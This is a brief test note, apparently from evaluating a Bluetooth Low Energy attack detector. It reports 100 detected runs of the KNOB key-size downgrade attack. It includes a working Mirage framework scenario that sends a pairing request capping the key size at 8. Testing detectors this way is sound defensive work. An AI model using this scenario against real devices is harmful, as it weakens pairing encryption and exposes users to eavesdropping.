
## KNOB

- Ran the `knob.sh` script for 100 successfull mirage attack with the following knob scenario:

```python
from mirage.core import scenario
from mirage.libs import io,ble,utils

class knob(scenario.Scenario):

    def onStart(self):
        self.emitter = self.module.getEmitter(self.module["INTERFACE"])
        self.emitter.send(ble.BLEPairingRequest(authentication=0x0d, inputOutputCapability=0x4, initiatorKeyDistribution=0x7, responderKeyDistribution=0x7, maxKeySize=8))
```

- Over 100 runs, observe a 100 True Positive and 0 False Positive.

